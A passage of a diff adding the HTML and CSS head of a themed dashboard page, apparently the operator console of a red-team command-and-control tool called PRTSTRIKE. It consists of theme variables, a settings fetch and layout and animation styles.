@@ -1,0 +1,2781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script>
+        // Theme Management
+        const THEMES = {
+            'PRTSTRIKE_DARK': {
+                '--bg': '#0a0a0a',
+                '--surface': '#121212',
+                '--accent': '#7d8e8e',
+                '--accent-alt': '#ff9d00',
+                '--text-main': '#e0e0e0',
+                '--text-dim': 'rgba(255, 255, 255, 0.25)',
+                '--border': 'rgba(255, 255, 255, 0.08)'
+            },
+            'COLUMBIA_LIGHT': {
+                '--bg': '#ffffff',
+                '--surface': '#f5f5f7',
+                '--accent': '#0071e3',
+                '--accent-alt': '#ff9500',
+                '--text-main': '#000000',
+                '--text-dim': 'rgba(0, 0, 0, 0.6)',
+                '--border': 'rgba(0, 0, 0, 0.15)'
+            },
+            'LATERANO_GOLD': {
+                '--bg': '#12100e',
+                '--surface': '#1c1815',
+                '--accent': '#d4af37',
+                '--accent-alt': '#ffffff',
+                '--text-main': '#f5f5f5',
+                '--text-dim': 'rgba(212, 175, 55, 0.3)',
+                '--border': 'rgba(212, 175, 55, 0.2)'
+            }
+        };
+
+        window.applyTheme = function(name) {
+            const theme = THEMES[name] || THEMES['PRTSTRIKE_DARK'];
+            const root = document.documentElement;
+            for (const [key, value] of Object.entries(theme)) {
+                root.style.setProperty(key, value);
+            }
+        };
+
+        // Initialize Settings
+        fetch('/api/settings')
+            .then(r => r.json())
+            .then(res => {
+                if (res.status === 'success' && res.data) {
+                    if (res.data.theme) window.applyTheme(res.data.theme);
+                    if (res.data.server_name) document.title = "DASHBOARD // " + res.data.server_name;
+                }
+            })
+            .catch(console.error);
+
+        // Check session storage immediately to avoid FOUC (Flash of Unstyled Content)
+        // If not just logged in, hide the entrance overlay immediately
+        if (sessionStorage.getItem('justLoggedIn') !== 'true') {
+            document.write('<style>.entrance-overlay { display: none !important; }</style>');
+        }
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DASHBOARD // PRTSTRIKE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0a0a; /* 稍微调亮一点，从 #050505 改为 #0a0a0a */
+            --surface: #121212;
+            --accent: #7d8e8e;
+            --accent-alt: #ff9d00; 
+            --text-main: #e0e0e0; /* 统一文字颜色 */
+            --text-dim: rgba(255, 255, 255, 0.25);
+            --border: rgba(255, 255, 255, 0.08);
+            --danger: #ff3b30;
+            --success: #00ffb3;
+            --glitch-red: rgba(255, 0, 80, 0.4);
+            --glitch-cyan: rgba(0, 255, 255, 0.4);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-user-drag: none;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* 转场黑幕 - 与 index.php 完全一致的物理衔接 */
+        .entrance-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 10000; /* 统一 z-index */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            will-change: transform;
+        }
+
+        .entrance-overlay.hidden {
+            transform: translateY(-100%);
+            pointer-events: none;
+        }
+
+        /* 系统日志流样式 - 严禁修改 */
+        .curtain-logs-fixed {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            opacity: 0.2; /* 统一透明度 */
+            overflow: hidden;
+            pointer-events: none;
+            display: block;
+            line-height: 1.2;
+            z-index: 1;
+            column-count: 4;
+            column-gap: 40px;
+        }
+
+        .log-line {
+            white-space: nowrap;
+            animation: logFade 0.5s ease-out forwards;
+        }
+
+        @keyframes logFade {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes curtainTextGlitch {
+            0% { transform: translate(0); text-shadow: -2px 0 var(--glitch-red), 2px 0 var(--glitch-cyan); }
+            20% { transform: translate(-2px, 1px); }
+            40% { transform: translate(-2px, -1px); }
+            60% { transform: translate(2px, 1px); }
+            80% { transform: translate(2px, -1px); }
+            100% { transform: translate(0); text-shadow: 2px 0 var(--glitch-red), -2px 0 var(--glitch-cyan); }
+        }
+
+        /* 背景装饰 */
+        .side-numbers {
+            position: fixed;
+            top: 0;
+            right: 20px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 8px;
+            color: var(--accent);
+            opacity: 0.04;
+            z-index: -1;
+            user-select: none;
+        }
+
+        /* 战术外框样式 - 严禁修改 */
+        .curtain-brackets-fixed {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            height: 240px;
+            border: 1px solid rgba(139, 125, 20, 0.2);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .curtain-brackets-fixed::before, .curtain-brackets-fixed::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--accent);
+        }
+
+        .curtain-brackets-fixed::before { top: -2px; left: -2px; border-right: 0; border-bottom: 0; }
+        .curtain-brackets-fixed::after { bottom: -2px; right: -2px; border-left: 0; border-top: 0; }
+
+        /* 统一的加载容器布局 - 严禁修改 */
+        .loading-container-fixed {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 30px;
+            background: rgba(0, 0, 0, 0.95);
+            border-left: 1px solid var(--accent);
+            border-right: 1px solid var(--accent);
+            width: 600px;
+            height: 160px;
+        }
+
+        .loading-container-fixed::before, .loading-container-fixed::after {
+            content: "";
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border: 2px solid var(--accent);
+        }
+        .loading-container-fixed::before { top: -2px; left: -2px; border-right: 0; border-bottom: 0; }
+        .loading-container-fixed::after { bottom: -2px; right: -2px; border-left: 0; border-top: 0; }
+
+        .loading-text-fixed {
+            font-family: 'Syncopate', sans-serif;
+            color: var(--accent);
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 10px;
+            text-shadow: 0 0 15px rgba(139, 125, 20, 0.5);
+            white-space: nowrap;
+            animation: curtainTextGlitch 0.2s infinite alternate;
+        }
+
+        .loading-progress-wrapper-fixed {
+            width: 320px;
+            height: 2px;
+            background: rgba(125, 142, 142, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loading-progress-bar-fixed {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+        }
+
+        .curtain-deco-fixed {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            opacity: 0.3;
+        }
+
+        .curtain-deco-fixed::before, .curtain-deco-fixed::after {
+            content: "PRTS_INITIALIZING";
+            position: absolute;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            letter-spacing: 2px;
+        }
+
+        .curtain-deco-fixed::before { top: 40px; left: 40px; transform: rotate(-90deg) translateX(-100%); transform-origin: top left; }
+        .curtain-deco-fixed::after { bottom: 40px; right: 40px; transform: rotate(90deg) translateX(100%); transform-origin: bottom right; }
+
+        @keyframes loadingProgress {
+            0% { transform: scaleX(0); }
+            100% { transform: scaleX(1); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        .noise-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: 
+                repeating-radial-gradient(#000 0 0.0001%,#fff 0 0.0002%) 50% 0/2500px 2500px,
+                repeating-conic-gradient(#000 0 0.0001%,#fff 0 0.0002%) 50% 50%/2500px 2500px;
+            background-blend-mode: difference;
+            opacity: 0.03;
+            pointer-events: none;
+            z-index: 10001; 
+            filter: contrast(150) brightness(1.2);
+        }
+
+        .bg-deco {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+
+        .terra-deco {
+            position: fixed;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            opacity: 0.2; /* 与 index 对齐 */
+            letter-spacing: 5px; /* 与 index 对齐 */
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        .terra-vertical {
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--success);
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        .bottom-console {
+            height: 200px;
+            min-height: 35px;
+            background: var(--surface);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border-top: 2px solid var(--accent);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            z-index: 500;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.5);
+            transition: height 0.3s ease;
+            resize: vertical;
+            overflow: hidden;
+        }
+
+        .bottom-console.collapsed {
+            height: 35px !important;
+        }
+
+        .bottom-console.collapsed .console-body,
+        .bottom-console.collapsed .console-input-area {
+            display: none;
+        }
+
+        .console-toggle {
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--accent);
+            background: none;
+            border: none;
+            padding: 2px 8px;
+            transition: transform 0.3s;
+        }
+
+        .bottom-console.collapsed .console-toggle {
+            transform: rotate(180deg);
+        }
+
+        .console-header {
+            height: 30px;
+            background: rgba(125, 142, 142, 0.1);
+            border-bottom: 1px solid rgba(125, 142, 142, 0.2);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            justify-content: space-between;
+        }
+
+        .console-tabs {
+            display: flex;
+            gap: 20px;
+        }
+
+        .console-tab {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            padding: 5px 0;
+        }
+
+        .console-tab.active {
+            color: var(--accent);
+        }
+
+        .console-tab.active::after {
+            content: "";
+            position: absolute;
+            bottom: 0; left: 0; width: 100%; height: 2px;
+            background: var(--accent);
+        }
+
+        .console-body {
+            flex: 1;
+            padding: 10px 15px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-main);
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent) transparent;
+        }
+
+        .log-entry {
+            margin-bottom: 4px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .log-time { color: var(--text-dim); }
+        .log-tag { color: var(--accent); font-weight: bold; }
+        .log-msg { color: var(--text-main); }
+        .log-tag.error { color: var(--danger); }
+        .log-tag.success { color: #00ff00; }
+
+        .console-input-area {
+            height: 35px;
+            background: var(--bg);
+            border-top: 1px solid rgba(125, 142, 142, 0.2);
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+        }
+
+        .console-prompt {
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            margin-right: 10px;
+        }
+
+        .console-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            outline: none;
+        }
+
+        /* 全局容器布局调整 */
+        .app-wrapper {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            z-index: 10;
+            opacity: 1;
+            padding-top: 80px; /* 为固定的 Header 留出空间 */
+        }
+
+        .app-body {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            min-height: 0; /* Critical for flex children to shrink */
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+            min-height: 0;
+        }
+
+        .main-content {
+            flex: 1;
+            overflow-y: auto;
+            min-height: 0;
+            padding-bottom: 15px;
+        }
+
+        /* 左侧侧边栏 (若依风格) */
+        /* 极致衔接：继承 index.php 的立绘作为底层背景 */
+        .char-reveal-legacy {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            height: 90vh;
+            z-index: -1; /* 移动到最底层 */
+            opacity: 0.1; /* 降低透明度，使其更像背景 */
+            filter: grayscale(100%) contrast(1.2); /* 灰度处理，减少干扰 */
+            pointer-events: none;
+            transition: all 1s ease;
+        }
+
+        /* 衔接 index.php 的扫描线余韵 */
+        .gacha-scan-legacy {
+            position: fixed;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            top: 0;
+            z-index: 10001; /* 在遮罩之上 */
+            opacity: 0;
+            box-shadow: 0 0 20px var(--accent);
+            pointer-events: none;
+            animation: legacyScan 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+
+        @keyframes legacyScan {
+            0% { top: 0; opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+        /* Welcome 界面样式 */
+        .welcome-screen {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .welcome-title {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 48px;
+            font-weight: 900;
+            color: var(--accent);
+            letter-spacing: 20px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(125, 142, 142, 0.3);
+            opacity: 1; /* 移除初始透明，实现即时显示 */
+            transform: none; /* 移除初始缩放 */
+        }
+
+        body.revealed .welcome-title {
+            /* 移除 animation */
+        }
+
+        .welcome-subtitle {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: #fff;
+            opacity: 0.6;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 60px;
+        }
+
+        .quick-stats {
+            display: flex;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        .stat-card {
+            background: rgba(125, 142, 142, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(125, 142, 142, 0.2);
+            padding: 20px 30px;
+            width: 200px;
+            position: relative;
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 80% 100%, 0 100%);
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            background: rgba(125, 142, 142, 0.1);
+            border-color: var(--accent);
+            transform: translateY(-5px);
+        }
+
+        .stat-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .stat-value {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--accent);
+            text-align: left;
+        }
+
+        .stat-deco {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 4px;
+            height: 4px;
+            background: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+        }
+
+        body.revealed .welcome-subtitle {
+            /* 移除 animation */
+        }
+
+        @keyframes welcomeFadeIn {
+            from { opacity: 0; transform: scale(1.1) translateY(20px); filter: blur(10px); }
+            to { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* 优化内容揭示动画 */
+        @keyframes contentReveal {
+            0% { 
+                opacity: 0; 
+                transform: translateY(20px); 
+                filter: blur(5px);
+            }
+            100% { 
+                opacity: 1; 
+                transform: translateY(0); 
+                filter: blur(0);
+            }
+        }
+
+        /* 覆盖之前的样式 */
+        .sidebar {
+            z-index: 100;
+        }
+
+        /* 初始状态：不再隐藏，配合 app-wrapper 的即时显示 */
+        .sidebar, 
+        header {
+            opacity: 1;
+            will-change: transform, opacity;
+        }
+
+        /* 移除动画：让 dashboard 只有一个黑幕推开的入场动画 */
+        body.revealed .sidebar {
+            animation: none;
+        }
+
+        body.revealed header {
+            animation: none;
+        }
+
+        /* 顶部扫描线装饰 (仅在 revealed 后出现) */
+        .scan-line-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+            z-index: 9998;
+            opacity: 0;
+            transition: opacity 2s ease-in-out;
+        }
+        
+        body.revealed .scan-line-overlay {
+            opacity: 0.3;
+        }
+
+        /* C&C 战术侧边栏样式 */
+        .sidebar {
+            width: 240px;
+            height: 100%;
+            background: rgba(10, 10, 10, 0.3);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border-right: 2px solid var(--accent);
+            display: flex;
+            flex-direction: column;
+            z-index: 100;
+            position: relative;
+            box-shadow: 10px 0 30px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+        }
+
+        /* 扫描线效果 */
+        .sidebar::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+            z-index: 101;
+            opacity: 0.3;
+        }
+
+        .sidebar::before {
+            content: "";
+            position: absolute;
+            top: 0; right: 0; bottom: 0;
+            width: 4px;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                var(--accent) 2px,
+                var(--accent) 4px
+            );
+        }
+
+        /* 弹窗样式 */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            width: 800px;
+            height: 500px;
+            background: #0a0a0a;
+            border: 1px solid var(--accent);
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 1);
+            position: relative;
+        }
+
+        .modal-header {
+            height: 40px;
+            background: rgba(125, 142, 142, 0.1);
+            border-bottom: 1px solid rgba(125, 142, 142, 0.2);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            justify-content: space-between;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 900;
+            letter-spacing: 2px;
+        }
+
+        .modal-close {
+            cursor: pointer;
+            font-size: 20px;
+            transition: transform 0.2s;
+        }
+
+        .modal-close:hover {
+            transform: scale(1.2) rotate(90deg);
+        }
+
+        .interact-terminal {
+            flex: 1;
+            background: #050505;
+            padding: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff00;
+            overflow-y: auto;
+            border-bottom: 1px solid rgba(125, 142, 142, 0.2);
+        }
+
+        .interact-input-area {
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            background: #000;
+        }
+
+        .interact-prompt {
+            color: var(--accent);
+            margin-right: 15px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .interact-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .brand-logo {
+            display: flex;
+            flex-direction: column;
+            transform: translateY(10px);
+        }
+
+        .rhine-tag {
+            font-size: 10px;
+            font-weight: 900;
+            color: var(--accent);
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px var(--accent);
+        }
+
+        .logo-text {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--accent);
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px rgba(125, 142, 142, 0.6);
+            margin-top: 4px;
+            position: relative;
+        }
+
+        .logo-text::after {
+            content: "PRT_SYSTEM_STRIKE_MODE";
+            position: absolute;
+            bottom: -12px;
+            left: 0;
+            font-size: 8px;
+            letter-spacing: 2px;
+            opacity: 0.5;
+            color: var(--text-dim);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .sidebar-nav {
+            flex: 1;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(125, 142, 142, 0.3) transparent;
+        }
+
+        .sidebar-nav::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .sidebar-nav::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .sidebar-nav::-webkit-scrollbar-thumb {
+            background: rgba(125, 142, 142, 0.3);
+            border-radius: 2px;
+        }
+
+        .sidebar-nav::-webkit-scrollbar-thumb:hover {
+            background: rgba(125, 142, 142, 0.6);
+        }
+
+        .nav-item {
+            display: grid;
+            grid-template-columns: 40px 1fr;
+            align-items: center;
+            height: 45px;
+            padding: 0 10px;
+            color: var(--accent);
+            text-decoration: none;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            background: rgba(125, 142, 142, 0.05);
+            border: 1px solid rgba(125, 142, 142, 0.2);
+            clip-path: polygon(0 0, 90% 0, 100% 30%, 100% 100%, 10% 100%, 0 70%);
+            transition: all 0.2s steps(4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-item::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 4px; height: 100%;
+            background: var(--accent);
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .nav-item:hover, .nav-item.active {
+            color: #fff;
+            background: rgba(125, 142, 142, 0.2);
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(125, 142, 142, 0.3);
+            /* 移除 transform: translateX(5px) */
+        }
+
+        .nav-item.active::before {
+            opacity: 1;
+        }
+
+        .nav-item.danger {
+            color: var(--danger);
+            background: rgba(255, 59, 48, 0.05);
+            border-color: rgba(255, 59, 48, 0.2);
+        }
+
+        .nav-item.danger:hover {
+            background: rgba(255, 59, 48, 0.2);
+            border-color: var(--danger);
+            text-shadow: 0 0 10px var(--danger);
+        }
+
+        /* Welcome 界面样式 */
+        .welcome-screen {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .welcome-title {
+            font-family: 'Syncopate', sans-serif;
+            font-size: 64px;
+            font-weight: 700;
+            letter-spacing: 15px;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
+            margin-bottom: 10px;
+        }
+
+        .welcome-subtitle {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--accent);
+            letter-spacing: 5px;
+            opacity: 0.6;
+        }
+
+        /* 页面切换逻辑 */
+        .content-page {
+            display: none;
+            height: 100%;
+            width: 100%;
+        }
+
+        .content-page.active {
+            display: block;
+        }
+        
+        .beacons-container.content-page.active {
+            display: grid;
+        }
+
+        .nav-item i {
+            font-size: 16px;
+            display: flex;
+            justify-content: center;
+            opacity: 0.6; /* 统一降低图标亮度 */
+            transition: opacity 0.2s;
+        }
+
+        .nav-item:hover i, .nav-item.active i {
+            opacity: 1; /* 激活时恢复亮度 */
+        }
+
+        .nav-label {
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* 顶部状态栏样式修复 (参考 CobaltStrike/Viper) */
+        .rhine-data-stream {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            opacity: 0.8;
+            letter-spacing: 1px;
+            background: rgba(125, 142, 142, 0.1);
+            padding: 4px 12px;
+            border-left: 2px solid var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background: var(--accent);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--accent);
+            animation: pulse-gfx 2s infinite;
+        }
+
+        @keyframes pulse-gfx {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .operator-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+        }
+
+        .operator-info span {
+            color: var(--accent);
+            font-weight: bold;
+            text-shadow: 0 0 8px rgba(125, 142, 142, 0.4);
+        }
+
+        /* 战术注销按钮 (参考 Sliver/C&C) */
+        .logout-link {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            font-weight: 800;
+            color: var(--danger);
+            text-decoration: none;
+            padding: 5px 15px;
+            border: 1px solid rgba(255, 59, 48, 0.4);
+            background: rgba(255, 59, 48, 0.05);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            position: relative;
+            transition: all 0.2s steps(3);
+            clip-path: polygon(10% 0, 100% 0, 100% 70%, 90% 100%, 0 100%, 0 30%);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logout-link:hover {
+            background: var(--danger);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 59, 48, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .logout-link::before {
+            content: "SEC_TERM";
+            font-size: 8px;
+            opacity: 0.7;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .rhine-data-stream {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(125, 142, 142, 0.05);
+            padding: 8px 15px;
+            border: 1px solid rgba(125, 142, 142, 0.2);
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .rhine-data-stream::before {
+            content: "";
+            position: absolute;
+            top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(125, 142, 142, 0.1), transparent);
+            animation: stream-scan 3s infinite;
+        }
+
+        @keyframes stream-scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        /* 右侧主容器 - 使用 app-body 中的 flex: 1 定义 (line ~442) */
+
+        /* 顶部导航 (调整后) */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            background: rgba(5, 5, 5, 0.7);
+            border-bottom: 2px solid var(--accent);
+            z-index: 1000;
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9);
+        }
+
+        /* 主体内容区 */
+        main {
+            flex: 1;
+            padding: 20px;
+            display: block;
+            overflow-y: auto;
+            overflow-x: hidden;
+            position: relative;
+            z-index: 15;
+            min-height: 0;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(125, 142, 142, 0.3) transparent;
+        }
+
+        main::-webkit-scrollbar { width: 4px; }
+        main::-webkit-scrollbar-track { background: transparent; }
+        main::-webkit-scrollbar-thumb { background: rgba(125, 142, 142, 0.3); border-radius: 2px; }
+        main::-webkit-scrollbar-thumb:hover { background: rgba(125, 142, 142, 0.6); }
+        
+        .dashboard-content {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            overflow-y: auto;
+            scrollbar-width: none;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+
+        .card {
+            background: rgba(26, 26, 26, 0.4);
+            border: 1px solid var(--border);
+            padding: 25px;
+            position: relative;
+            clip-path: polygon(0 0, 95% 0, 100% 10%, 100% 100%, 5% 100%, 0 90%);
+            transition: all 0.3s;
+            backdrop-filter: blur(10px) saturate(180%);
+            -webkit-backdrop-filter: blur(10px) saturate(180%);
+        }
+
+        .card:hover {
+            border-color: var(--accent);
+            background: rgba(255, 207, 0, 0.05);
+        }
+
+        .card::after {
+            content: "PRTS_V4.2";
+            position: absolute;
+            top: 5px; right: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 8px;
+            color: var(--accent);
+            opacity: 0.3;
+        }
+
+        .metric-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+        }
+
